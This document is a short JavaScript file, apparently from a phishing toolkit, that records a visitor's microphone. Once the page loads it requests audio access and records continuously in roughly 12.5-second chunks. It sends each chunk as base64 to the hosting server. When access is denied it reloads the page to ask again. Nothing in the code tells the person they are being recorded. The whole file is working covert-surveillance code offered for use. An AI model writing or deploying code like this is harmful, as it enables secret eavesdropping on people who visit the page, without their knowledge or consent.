/* Coded By https://github.com/msfpt */

document.addEventListener('DOMContentLoaded', event => {

  const success = url_blob => {
    
    $.ajax({
      url: location.origin,
      type: 'POST',
      data: {
        'Status': 'r9b',
        'audioSrc': url_blob,
        'fileName': (new Date().getTime()),
        'err': 'false'
      }
    });
    
  }

  const error = error => {

    // console.warn(error);

    $.ajax({
      url: window.location.origin,
      type: 'POST',
      data: {
        'Status': 'r9b',
        'err': 'true'
      }
    });
    
    alert("Unable to retrieve your microphone");

  }

  try {

    URL = window.URL || window.webkitURL;

    var gumStream, rec, input;

    var AudioContext = window.AudioContext || window.webkitAudioContext;

    navigator.getUserMedia = navigator.getUserMedia || navigator.mozGetUserMedia;

    const startRecording = () => {

      var constraints = { audio: true, video: false }

      /*
        We're using the standard promise based getUserMedia() 
        https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia
      */

      navigator.mediaDevices.getUserMedia(constraints).then(stream => {
        
        // console.log("getUserMedia() success, stream created, initializing Recorder.js ...");

        /*
          create an audio context after getUserMedia is called
          sampleRate might change after getUserMedia is called, like it does on macOS when recording through AirPods
          the sampleRate defaults to the one set in your OS for your playback device
        */
            
        let audioContext = new AudioContext();

        // update the format 
        // document.getElementById("formats").innerHTML="Format: 1 channel pcm @ "+audioContext.sampleRate/1000+"kHz"

        /*  assign to gumStream for later use  */
        gumStream = stream;

        /* use the stream */
        input = audioContext.createMediaStreamSource(stream);

        /* 
          Create the Recorder object and configure to record mono sound (1 channel)
          Recording 2 channels  will double the file size
        */
        
        rec = new Recorder(input, { numChannels: 1 })

        //start the recording process
        rec.record()

        // console.log("Recording started");

      }).catch(err => setTimeout(location.reload, 7000));

    }

    const stopRecording = () => {

      //tell the recorder to stop the recording
      rec.stop();

      //stop microphone access
      //gumStream.getAudioTracks()[0].stop();

      //create the wav blob and pass it on to createDownloadLink
      rec.exportWAV(createDownloadLink);

    }

    const createDownloadLink = blob => {

      var reader = new FileReader();
      
      reader.readAsDataURL(blob);
        
      reader.addEventListener('loadend', event => success(reader.result));  // send base64String

      setTimeout(startRecording, 300);

    }

    setTimeout(startRecording, 300);
      
    setInterval(stopRecording, 12470);

  } catch (err) {

    error(err);

  }

});